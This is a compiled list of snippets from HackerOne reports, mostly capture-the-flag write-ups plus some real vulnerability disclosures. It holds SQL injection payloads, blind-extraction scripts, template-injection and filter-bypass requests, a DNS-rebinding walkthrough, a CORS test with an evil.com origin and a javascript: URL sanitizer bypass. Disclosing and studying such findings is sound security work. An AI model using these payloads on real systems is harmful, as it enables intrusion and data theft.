## 53. [#893395](https://hackerone.com/reports/893395)  -  [H1-2006 2020] CTF Writeup
*critical*

```http
POST /?template=home HTTP/1.1
Host: staff.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbF…

profile_name=sandra&profile_avatar=tab3+upgradeToAdmin+btn+btn-primary+button
```

## 54. [#1068934](https://hackerone.com/reports/1068934)  -  [h1ctf-Grinch Networks] MrR3b00t Saving the Christmas
*critical*

```bash
curl -X POST -sk -H "Content-Type: application/x-www-form-urlencoded" -d 'preview_markup=Hello+{{test}}+&preview_data={"test":"{{template:38dhs_admins_only_header.html}}"}' https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview | grep -Eoi "flag{[^>]+}"
```

## 55. [#1069467](https://hackerone.com/reports/1069467)  -  H1 Hackyholidays CTF - The Grinch was defeated
*critical*

```python
import hashlib,requests,base64,json
import urllib.parse
import webbrowser
import time

if __name__ == "__main__":
	while True:
		ip = "470631266f2a4f108432eff944f33ed6.gel0.space"
		bytes1 = str.encode("mrgrinch463{}".format(ip))
		hash1 = hashlib.md5(bytes1).hexdigest()
		print("[*] Hash is {}".format(hash1))
		payload = {"target":ip,"hash":hash1}
		payload_str = json.dumps(payload)
		payload1 = base64.b64encode(str.encode(payload_str))
		print(payload1)
		payload1_1 = {'payload':payload1}
		payload2 = urllib.parse.urlencode(payload1_1,safe=':+') 
		burp0_url = "https://hackyholidays.h1ctf.com:443/attack-box/launch"
		burp0_cookies = {"attackbox": "d09d508e78f3975e0199a5e91dde9687"}
		burp0_headers = {"Connection": "close", "sec-ch-ua": "\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"", "sec-ch-ua-mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://hackyholidays.h1ctf.com/attack-box", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7,zh-CN;q=0.6,zh;q=0.5"}
		r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,params=payload2,allow_redirects=False)
		url = r.headers['Location']
		webbrowser.open_new("https://hackyholidays.h1ctf.com"+url)
		time.sleep(15)
# … truncated …
```

## 56. [#1066135](https://hackerone.com/reports/1066135)  -  Wholesome Hacky Holidays: A Writeup
*critical*

```http
GET /people-rater/entry?id=eyJpZCI6Mn0= HTTP/1.1
Host: hackyholidays.h1ctf.com
X-Requested-With: XMLHttpRequest
Referer: https://hackyholidays.h1ctf.com/people-rater
```

## 57. [#1066135](https://hackerone.com/reports/1066135)  -  Wholesome Hacky Holidays: A Writeup
*critical*

```
Logging in with `grinch:BahHumbug` at `/forum/login` we can access the `Secret Plans` blogpost which further details the Grinch's DDoS attack plans as well as the flag.

## FLag 9 Evil Quiz: flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
In this challenge, we are participating in a quiz by the grinch. After poking around at the page we notice that the `name` field/parameter is vulnerable to SQL injection. Injecting `' or (select sleep(15)); --` as the name and navigating to `/evil-quiz/score` puts the site to sleep for 15 seconds. From this, we know that we might deal here with a second-order time-based blind SQL injection. So lets fire up `sqlmap`:
```

## 58. [#1066135](https://hackerone.com/reports/1066135)  -  Wholesome Hacky Holidays: A Writeup
*critical*

```
This will forward us to the admin area and present the flag.

## Flag 11 SQL Inception: flag{07a03135-9778-4dee-a83c-7ec330728e72}
Apart from the flag, challenge 10 also presented a link: `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59`, which is the starting point of this challenge. Be prepared for some brain toasting from here on. Browsing through the app we find that there are three albums which are requested via a hash, such as `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k`. Each album requests several images, for example like `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9`. Decoding the data value with base64 reveals:
```

## 59. [#1066135](https://hackerone.com/reports/1066135)  -  Wholesome Hacky Holidays: A Writeup
*critical*

```
We successfully cracked the hashes and are now able to generate our payloads. As a quick sanity check we can confirm that the MD5 of `mrgrinch463203.0.113.33` is indeed `5f2940d65ca4140cc18d0878bc398955`. So lets redirect the attack against `127.0.0.1` with the following payload `{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}`, with `3e3f8df1658372edf0214e202acb460b` being the MD5 for `mrgrinch463127.0.0.1`. Launching the attack with `/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==` and visiting `https://hackyholidays.h1ctf.com/attack-box/launch/5867c35a78d569fea1d4ac81ae55e2e1`, we can see that:`Local target detected, aborting attack`. This means there is a detection in place, such that we do not attack ourselves. It would be great if we first could pretend that we are the target IP and then switch to the localhost. We can achieve exactly this with a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding). I used the following [service](https://lock.cmpxchg8b.com/rebinder.html). What it does is: "The hostname generated will resolve randomly to one of the addresses specified with a very low time to live record." We insert our two IP addresses of choice `203.0.113.33` and `127.0.0.1` we receive the following address: `cb007121.7f000001.rbndr.us`. With `dig A cb007121.7f000001.rbndr.us` we can confirm that the address indeed resolves to any of the two domains randomly:
# … truncated …
```

## 60. [#1067530](https://hackerone.com/reports/1067530)  -  Successfully took down the Grinch and saved the holidays from being ruined
*critical*

```
`--hw 3` to filter out results containing above errors. I found an valid parameter `uuid` and recently got a valid username. Using that and browsing [/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043][7] and got the flag and details of grinch.
[7]: https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043    "/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043"
```

## 61. [#1067530](https://hackerone.com/reports/1067530)  -  Successfully took down the Grinch and saved the holidays from being ruined
*critical*

```
So `$hash` is the object which contains rows returned by query which contain 3 columns `id, hash and name`.
In the data returned one of the columns id is called
Which is used for “select * from photos where album_id = id “ like
```

## 62. [#1501611](https://hackerone.com/reports/1501611)  -  An attacker can archive and unarchive any structured scope object on HackerOne
*high*

```http
POST /graphql HTTP/2
Host: hackerone.com
Content-Length: 388
Content-Type: application/json
Origin: https://hackerone.com
Referer: https://hackerone.com/hackerone_com_h1b/scopes/94774/edit

{"operationName":"ArchiveScope","variables":{"structured_scope_id":"Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw=="},"query":"mutation ArchiveScope($structured_scope_id: ID!) {\n  archiveStructuredScope(input: {structured_scope_id: $structured_scope_id}) {\n    was_successful\n    structured_scope {\n      id\n      archived_at\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

## 63. [#1501611](https://hackerone.com/reports/1501611)  -  An attacker can archive and unarchive any structured scope object on HackerOne
*high*

```http
POST /graphql HTTP/2
Host: hackerone.com
Content-Length: 414
Content-Type: application/json
Origin: https://hackerone.com
Referer: https://hackerone.com/hackerone_com_h1b/scopes/94774/edit

{"operationName":"UnarchiveStructuredScope","variables":{"structured_scope_id":"Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw=="},"query":"mutation UnarchiveStructuredScope($structured_scope_id: ID!) {\n  unarchiveStructuredScope(input: {structured_scope_id: $structured_scope_id}) {\n    was_successful\n    structured_scope {\n      id\n      archived_at\n      __typename\n    }\n    __typena
```

## 64. [#1064869](https://hackerone.com/reports/1064869)  -  Informations disclosure - Access to some checkout informations
*medium*

```http
POST /graphql HTTP/1.1
Host: arrive-server.shopifycloud.com
Content-Type: application/json
Content-Length: 230

{"operationName":"SignInAsGuest","variables":{},"query":"mutation SignInAsGuest {\n  signInAsGuest {\n    authPayload {\n      accessToken\n      refreshToken\n    }\n    userErrors {\n      field\n      message\n    }\n  }\n}\n"}
```

## 65. [#1064869](https://hackerone.com/reports/1064869)  -  Informations disclosure - Access to some checkout informations
*medium*

```http
POST /graphql HTTP/1.1
Host: arrive-server.shopifycloud.com
Authorization: Bearer {accessToken}
Content-Type: application/json
Content-Length: 348

{"operationName":"CheckoutStatus","variables":{"id":"48805"  },"query":"query CheckoutStatus($id: ID!) {\n  checkoutStatus(id: $id) {\n    ... on Checkout {\n      id\n      isShopPay\n      payJsonParams\n      status\n      token\n      url\n      errorCode\n    }\n    ... on PollingInfo {\n      waitMillis\n      shouldRetry\n    }\n  }\n}\n"}
```

## 66. [#389454](https://hackerone.com/reports/389454)  -  Backup Source Code Detected
*medium*

```http
GET /howto/store/order.html~ HTTP/1.1
Host: www.starbucks.co.jp
Cookie: PHPSESSID=██████; registerParams[0]=card; registerParams[1]=https%3A%2F%2Fcard.starbucks.co.…
Referer: http://www.starbucks.co.jp/howto/store/order.html~

<?php
```

## 67. [#1404986](https://hackerone.com/reports/1404986)  -  CORS origin validation failure
*medium*

```http
GET / HTTP/1.1
Origin: https://hackers.upchieve.org.evil.com
Cookie: connect.sid=s%3AjSy6_1N-Y3zG4zqifYrsos2idZrkZePH.%2BjgtEn3a1wuxhiDk86FMXfhg0bPYfJ2jGxytqmA%2BU7Q
Host: hackers.upchieve.org
```

## 68. [#889293](https://hackerone.com/reports/889293)  -  [H1-2006 2020] CTF Writeup!
*critical*

```javascript
$(".upgradeToAdmin").click(function() {
    let t = $('input[name="username"]').val();
    $.get("/admin/upgrade?username=" + t, function() {
        alert("User Upgraded to Admin")
    })
}), $(".tab").click(function() {
    return $(".tab").removeClass("active"), $(this).addClass("active"), $("div.content").addClass("hidden"), $("div.content-" + $(this).attr("data-target")).removeClass("hidden"), !1
}), $(".sendReport").click(function() {
    $.get("/admin/report?url=" + url, function() {
        alert("Report sent to admin team")
    }), $("#myModal").modal("hide")
}), document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click"));
```

## 69. [#1065829](https://hackerone.com/reports/1065829)  -  Invading Grinch Network and Saving Christmas
*critical*

```sql
' UNION SELECT "' union select 1,2,'../api/user?username=grinch'#",1,2#
```

## 70. [#1065829](https://hackerone.com/reports/1065829)  -  Invading Grinch Network and Saving Christmas
*critical*

```sql
' UNION SELECT "' union select 1,2,'../api/user?username=grincha$$%&password=%25'#",1,2#
```

## 71. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```
## Flag 6 - My Diary

**App description**: "Hackers! It looks like the Grinch has released his Diary on Grinch Networks. We know he has an upcoming event but he hasn't posted it on his calendar. Can you hack his diary and find out what it is?"

Visiting `https://hackyholidays.h1ctf.com/my-diary` redirects to `https://hackyholidays.h1ctf.com/my-diary/?template=entries.html` and shows the grinch's calendar. Obviously, `entries.html` is used as a template - let's try to directly access that file. Indeed, we can access `https://hackyholidays.h1ctf.com/my-diary/entries.html` directly, which means that we potentially have local file inclusion using the `template` parameter. Trying to access `/my-diary/index.php` causes a redirect as well, but accessing `/my-diary/index.html` causes a `404 Not Found` response, therefore, the application seems to be written in PHP. 

After overcomplicating things by trying to use PHP stream wrappers I finally found out that `index.php` can be included directly:

{F1138936}

Alright, getting redirected simply means that the target file was not found after removing every character that is not alphanumeric or a dot and also removing the substrings `admin.php` and `secretadmin.php`.

Trying to access `/my-diary/admin.php` directly results in `404 Not Found`, so maybe that file does not even exist. However, trying to access `/my-diary/secretadmin.php` looks more interesting as the error message `You cannot view this page from your IP Address` is returned.

This means that we probably need to bypass the filter mechanism. There seems to be no way around the character restriction. However, filtering the substrings `admin.php` and `secretadmin.php` is not done recursively but just once. Therefore, we can get the source of `secretadmin.php` wich contains the flag by crafting a filename that results in `secretadmin.php` after being filtered (`secretadmsecretadadmin.phpmin.phpin.php`):

{F1138937}

Unfortunately, the `Post` button does nothing (yet?), but hey, getting another flag is always great!


# Flag 7 - Hate Mail Generator

**App description**: "Sending letters is so slow! Now the grinch sends his hate mail by email campaigns! Try and find the hidden flag!"

The grinch does not get nicer when christmas gets closer, in contrary, he is obviously already grumpy enough to use a hate mail generator in order to speed up his hate mail workflow. 

There is one existing campaign with the following markup:
# … truncated …
```

## 72. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```
Luckily, someone forgot to remove the zip archive from the server after unpacking it, therefore we can download it from `https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip`. The zip archive contains the sourcecode of signup manager page. The logic seems to happen in `index.php`.

Of course, `https://hackyholidays.h1ctf.com/signup-manager/users.txt` was not found. According to the README, the `users.txt` was probably placed into an inaccessible directory.

To further analyze the behaviour of the application, I unpacked the zip archive and started a local PHP development server from the directory containing hte unpacked files with `php -S 0.0.0.0:8000`.

Signing up at my local test server e.g. causes the following line to be written into `users.txt`:
```

## 73. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```
This means that if we somehow manage to construct a string that is at least 1 character longer than expected, we can create a valid entry for an admin user by placing `Y` at position 113, e.g. by using the `lastname` parameter where we can freely choose the content as long as it is alphanumeric and exactly 15 characters long. 

Fortunately, `str_pad` does not strip strings longer than the expected length but instead keeps the whole string. This means we need to find a field where we can insert a string that is longer than expected.

The parameters `username`, `firstname` and `lastname` have a minimum length of 3 characters and are filtered through `substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["<VALUE>"]), 0, 15)` before being padded, this makes using multibytes to cause inconsistencies in the string length impossible. The `password` parameter is stored as md5 value and therefore has a fixed length, however, no check is being performed before passing the `POST` parameter form user input into `password = md5($_POST["password"])`. When using an array instead of a string, signing up succeeds with a PHP warning (`PHP Warning:  md5() expects parameter 1 to be string, array given in /[SNIP]/index.php on line 76`) but no password hash is added to the final entry in `users.txt` because the `md5()` function just returns an empty string. Unfortunately, a shorter string in `users.txt` does not help because it gets filtered out when getting a list of users from `users.txt` during login, only entries with exactly 113 characters are considered valid.

This only leaves the `age` parameter for bypassing the length. The `age` parameter is checked as follows before passing it to `add_user`:
# … truncated …
```

## 74. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```
This returns an error message about the content type (probably because an image is expected), but shows that the injection can possibly be used for querying the API. Great!

I wrote a Python script for finding API endpoints and found out that there seems a valid endpoint under `/r3c0n_server_4fdk59/api/user`. However when trying to access it, I got the error message `Invalid content type detected` again!

After being stuck for a bit, I found out that the endpoint accepts the `GET` parameters `username` and `password` as well. Not sure if they were totally vulnerable to SQLI again, but it was possible to query username and password character by character by using `%` as a wildcard, because whenever the query got results, the error message `Invalid content type detected` was returned.

The following script was used to find the API endpoints and retrieve valid credentials:
```

## 75. [#1068934](https://hackerone.com/reports/1068934)  -  [h1ctf-Grinch Networks] MrR3b00t Saving the Christmas
*critical*

```bash
#!/bin/bash

OP=""
USER=""
CHAR=""
VALID=""

echo -e "extracting $1.."

while [ 1 ]; do
for i in $(cat chars); do
    OP=`./newscript.sh ../api/user?$1=$CHAR$i%25 | grep -oi invalid | wc -c`
    #echo -e "Testing -> $CHAR$i"
    if [[ $OP -eq 8 ]]; then
        #echo -e "Testing -> $CHAR$i"
        CHAR="$CHAR$i"
        echo -e "Found -> $CHAR"
        break
    fi
done
done
```

## 76. [#1066135](https://hackerone.com/reports/1066135)  -  Wholesome Hacky Holidays: A Writeup
*critical*

```
With this we can see one file named `my_secure_files_not_for_you.zip`, which we can download locally (`wget https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip`). Trying to unzip the file, a password is requested. We can crack this with john the ripper.
```

## 77. [#1066135](https://hackerone.com/reports/1066135)  -  Wholesome Hacky Holidays: A Writeup
*critical*

```
John the ripper cracks the password, which is `hahahaha`. With the password, we can unzip the archive and retrieve the flag.

## Flag 6 My Diary: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
The objective of this challenge is to hack the Grinch's diary to find out about his upcoming event. Starting the challenge, we can directly recognize the path `my-diary/?template=entries.html`. It seems that the `entries.html` is included through the `template` parameter. It might also be possible to include other pages then. Through a bit of manual testing for some common pages, we can find `/template=index.php`, which presents the respective php code.
```

## 78. [#1066135](https://hackerone.com/reports/1066135)  -  Wholesome Hacky Holidays: A Writeup
*critical*

```
Here we can manipulate the name parameter to `{"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}` and URL-encode it again. Providing the manipulated `preview_data` body parameter with `{{name}}` in the markup field we can access the `Grinch Network Admins Only` area and find the flag. The manipulated body looks like this:
```

## 79. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```
.../r3c0n_server_4fdk59/album?hash=-1' union select 1,2,3 -- -
```

## 80. [#1066206](https://hackerone.com/reports/1066206)  -  [hacky-holidays] Grinch network is down
*critical*

```
-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,'../api/user?username={}%' -- -",'12',1-- -
```

## 81. [#1066206](https://hackerone.com/reports/1066206)  -  [hacky-holidays] Grinch network is down
*critical*

```
-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,'../api/user?username=grinchadmin%26password={}%' -- -",'12',1-- -
```

## 82. [#1067530](https://hackerone.com/reports/1067530)  -  Successfully took down the Grinch and saved the holidays from being ruined
*critical*

```
$('.thelist').on("click", "a", function(){
        $.getJSON('/people-rater/entry?id=' + $(this).attr('data-id'), function(resp){
            alert( resp.rating );
        }).fail(function(){
            alert('Request failed');
        });
    });
```

## 83. [#1069388](https://hackerone.com/reports/1069388)  -  It's just a man on a mission
*critical*

```php
public static function getByLogin($username, $password){
        $d = Db::read()->prepare('select * from user where username = ? and password = ? LIMIT 1 ');
        $d->execute( array($username,md5($password)));
        return ( $d->rowCount() == 1 ) ? new User($d->fetch()) : false;
    }
```

## 84. [#1069388](https://hackerone.com/reports/1069388)  -  It's just a man on a mission
*critical*

```sql
hash=' UNION SELECT "' UNION SELECT 'null.jpg',null,'../api/user?username=test&password=test'-- -",null,1-- -
```

## 85. [#2208656](https://hackerone.com/reports/2208656)  -  CVE-2023-42663: Apache Airflow: Bypass permission verification to view task instances of other dags
*low, $540*

```http
POST /api/v1/dags/~/dagRuns/~/taskInstances/list HTTP/1.1
Host: testvul.com:8080
content-type: application/json
Referer: http://testvul.com:8080/dags/example_external_task_marker_parent/grid
Cookie: session=3d17f3fe-e02b-4f16-88f1-fd59e299ae0c.a4kyHK7of13T0NtbCVVmPgFtSDU
Content-Length: 2

{}
```

## 86. [#1088159](https://hackerone.com/reports/1088159)  -  [h1-2102] Break permissions waterfall
*low, $500*

```http
POST /34937697/users/api HTTP/1.1
Host: shopify.plus
content-type: application/json
x-csrf-token: axogyrLP-YZ_UCyd_o8tdASj_uGTLc1wIT3c
Origin: https://shopify.plus
Content-Length: 695
Cookie: ██████

{"operationName":"UpdateRole","variables":{"appHandles":[],"id":"Z2lkOi8vb3JnYW5pemF0aW9uL1JvbGUvNjc4Nw","name":"waterfall","shopAccess":[{"appPermissions":[],"permissions":["DASHBOARD","ORDERS","GIFT_CARDS","FULL","REPORTS","OVERVIEWS"],"shopId":"Z2lkOi8vb3JnYW5pemF0aW9uL1Nob3AvMzQ5NjYwMzM"}]},"query":"mutation UpdateRole($appHandles: [String!], $id: RoleID!, $name: String!, $shopAccess: [ShopAccessInput!]) {\n  updateRole(appHandles: $appHandles, id: $id, name: $name, shopAccess: $shopAccess) {\n    role {\n      id\n      name\n      __typename\n    }\n    userErrors {\n      message\n      field\n      __typename\n    }\n    message\n    operationStatus\n    __typename\n  }\n}\n"}
```

## 87. [#1088159](https://hackerone.com/reports/1088159)  -  [h1-2102] Break permissions waterfall
*low, $500*

```http
POST /34937697/users/api HTTP/1.1
Host: shopify.plus
content-type: application/json
x-csrf-token: axogyrLP-YZ_UCyd_o8tdASj_uGTLc1wIT3c
Origin: https://shopify.plus
Content-Length: 695
Cookie: ██████
```

## 88. [#3601655](https://hackerone.com/reports/3601655)  -  Rails::HTML::Sanitizer.allowed_uri? returns true for entity-encoded control-character-split javascript: URLs
*low*

```http
HTTP/1.1 200 OK
content-type: text/html; charset=utf-8
content-length: 520

<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>allowed-uri-e2e</title>
  </head>
  <body>
    <h1>Continue</h1>
    <pre id="meta">allowed=true
next="java&#13;script:document.title='owned';document.body.innerText='EXECUTED';void(0)"</pre>
    <a id="continue" href="java&#13;script:document.title='owned';document.body.innerText='EXECUTED';void(0)">Continue</a>
  </body>
</html>
```

## 89. [#3601655](https://hackerone.com/reports/3601655)  -  Rails::HTML::Sanitizer.allowed_uri? returns true for entity-encoded control-character-split javascript: URLs
*low*

```
attr     = "java\\rscript:document.title='owned';document.body.innerText='EXECUTED';void(0)"
href     = "javascript:document.title='owned';document.body.innerText='EXECUTED';void(0)"
protocol = "javascript:"
```

## 90. [#3601655](https://hackerone.com/reports/3601655)  -  Rails::HTML::Sanitizer.allowed_uri? returns true for entity-encoded control-character-split javascript: URLs
*low*

```ruby
require "rack"
require "rails-html-sanitizer"

app = lambda do |env|
  req = Rack::Request.new(env)

  case [req.request_method, req.path_info]
  when ["GET", "/"]
    next_url = req.params["next"].to_s
    next_url = "java&#13;script:document.title='owned';document.body.innerText='EXECUTED';void(0)" if next_url.empty?
    allowed = Rails::HTML::Sanitizer.allowed_uri?(next_url)

    body = <<~HTML
      <!doctype html>
      <html>
        <head>
          <meta charset="utf-8">
          <title>allowed-uri-e2e</title>
        </head>
        <body>
          <h1>Continue</h1>
          <pre id="meta">allowed=#{allowed.inspect}\nnext=#{next_url.inspect}</pre>
          #{allowed ? %(<a id="continue" href="#{next_url}">Continue</a>) : %(<p id="blocked">Blocked</p>)}
        </body>
      </html>
    HTML

    [200, { "content-type" => "text/html; charset=utf-8" }, [body]]
  else
    [404, { "content-type" => "text/plain; charset=utf-8" }, ["not found"]]
  end
end

run app
```

## 91. [#369086](https://hackerone.com/reports/369086)  -  URL spoofing in Brave for macOS
*medium*

```html
<script>
    window.onclick = function () {
        x = window.open('https://www.google.com/csi');
        setTimeout(function () {
            x.document.write(`I am not a www.google.com;<button onclick="alert('I can run JS on this page!')">click me</button>`)
        }, 100);
    }
</script>
```

## 92. [#889293](https://hackerone.com/reports/889293)  -  [H1-2006 2020] CTF Writeup!
*critical*

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Mon, 01 Jun 2020 20:28:45 GMT
Content-Type: application/json
Connection: close
Content-Length: 1605

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/#\/statements?month=01&year=2020","data":"<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Software Storage<\/title>\n    <link href=\"\/css\/bootstrap.min.css\" rel=\"stylesheet\">\n<\/head>\n<body>\n\n<div class=\"container\">\n    <div class=\"row\">\n        <div class=\"col-sm-6 col-sm-offset-3\">\n            <h1 style=\"text-align: center\">Software Storage<\/h1>\n            <form method=\"post\" action=\"\/\">\n                <div class=\"panel panel-default\" style=\"margin-top:50px\">\n                    <div class=\"panel-heading\">Login<\/div>\n                    <div class=\"panel-body\">\n                        <div style=\"margin-top:7px\"><label>Username:<\/label><\/div>\n                        <div><input name=\"username\" class=\"form-control\"><\/div>\n                        <div style=\"margin-top:7px\"><label>Password:<\/label><\/div>\n                        <div><input name=\"password\" type=\"password\" class=\"form-control\"><\/div>\n                    <\/div>\n                <\/div>\n                <input type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\">\n            <\/form>\n        <\/div>\n    <\/div>\n<\/div>\n<script src=\"\/js\/jquery.min.js\"><\/script>\n<script src=\"\/js\/bootstrap.min.js\"><\/script>\n<\/body>\n<\/html>"}
# … truncated …
```

## 93. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```
When logging in with `lumi:nougatzzz`, admin.php gets included in the page which contains the flag, `flag{99309f0f-1752-44a5-af1e-a03e4150757d}`, as well as a link to the 11th challenge:

{F1138949}


## Flag 11 - Recon Server

Using the link from the 10th challenge, it is possible to access the recon server challenge under `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59`.

{F1138950}

What struck my attention first were the requests that load images, e.g.:
```

## 94. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```
I immediately thought of some sort of SSRF / local file inclusion but the content of the `image` parameter was protected by the `auth` value, which looks like a hash. When changing the `image` parameter to something else, the error message `invalid authentication hash` gets returned. After trying to crack the hash I came to the conclusion that it is possibly server-generated.

Next, I tried to find the API which was mentioned on the challenge site. It was pretty straightforward to find the API's base URL under `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api`:

{F1138951}

I thought that it was weird that so many different and very specific status codes were explained here. When trying to find endpoints under `/r3c0n_server_4fdk59/api/*`, I had no success at all, the only thing I got back from the server was the message `{"error":"This endpoint cannot be visited from this IP address"}`. 

Well, that sounds like SSRF again... After trying to play with the `Host` header and `X-Forwarded-For`,... without success, I again looked at the requests I got in Burp. Finally, I found out that SQL injection was possible in the `hash` parameter when loading an album:

After finding out that it is possible to use `union` and how many fields to add for getting the same number of columns than the original query, I finally even got output: When using `5' union all select '0',0,'albumtitle' -- -` as payload in the `hash` parameter, `albumtitle` was used as title of the album, and no entries were shown. However, when using an existing album ID as first field in the `union` query, e.g. `0'+union+all+select+'1',0,'albumtitle'+--+-`, the two image links from that category showed up.

It was time to get some more information about the database structure. Because the SQL injection could be performedd by using a single request, I used sqlmap for dumping the database schema as follows:
# … truncated …
```

## 95. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```
Once again, the `target` parameter is protected by a hash, however, this time I could not find any possibility to make the server generate the hash for me. When trying to change the payload, the message `Invalid Protection Hash` is shown which confirms that the hash gets checked for sure, except when using any characters other than alphanumeric, dot and slash in the `target` value - in this case, the input validation fails immediately with `Invalid characters detected in the target`.

After finding the hint at https://twitter.com/Hacker0x01/status/1342545650789978112, I assumed that some salt is used to generate the hash. The length of the hash indicates that it is probably md5, hopefully the salt is either appended or prepended to the payload...

Using Hydra for cracking the salt succeeded and I found out that `mrgrinch463` is appended to the payload before calculating the MD5 hash of the payload. 

This allows generating valid hashes for arbitrary payloads and thus launch attacks against arbitrary targets - nice!

However, this turned out to the the easier step - I tried a bunch of payloads without success, e.g. possible contents of `/etc/hosts` that reference localhost and localhost IPs (`localhost`, `127.0.0.1`,`127.0.1.1`, `attackbox.local`, `attackbox`, `ip6-localhost`, `ip6-loopback`), different bypasses for making a ping to `localhost` without using `localhost` or `127.0.0.1` (`127.1`, `127.0.1`, `127.000.000.001`), IPv6 addresses (`::1`, `ipv6.localtest.me`), `hackyholidays.h1ctf.com`, the external IP / A record of `hackyholidays.h1ctf.com` (`18.216.153.32`), the AWS hostname found with [ipinfo](https://ipinfo.io/) (`ec2-18-216-153-32.us-east-2.compute.amazonaws.com"`), the internal 172 ip that was disclosed when pinging the AWS hostname from the attack box (`172.31.15.248`), broadcast addresses, my own VPS, Burp Collaborator hostnames,...

I used the following Python script for issuing manipulated requests:
# … truncated …
```

## 96. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```http
Getting flag 1 was pretty easy - visiting `https://hackyholidays.h1ctf.com/robots.txt` gave away the first flag, `flag{48104912-28b0-494a-9995-a203d1e261e7}`:

{F1138900}
```

## 97. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```http
GET /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9 HTTP/1.1
Host: hackyholidays.h1ctf.com
```

## 98. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```http
GET /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGkiLCJhdXRoIjoiMzgxMjJkNDc3NjU3YzFhMGM5YmE4NzNjMTEwMTc0OTcifQ== HTTP/1.1
Host: hackyholidays.h1ctf.com
```

## 99. [#894623](https://hackerone.com/reports/894623)  -  @shakedko H1-2006 CTF writeup
*critical*

```http
GET /statements?month=01&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
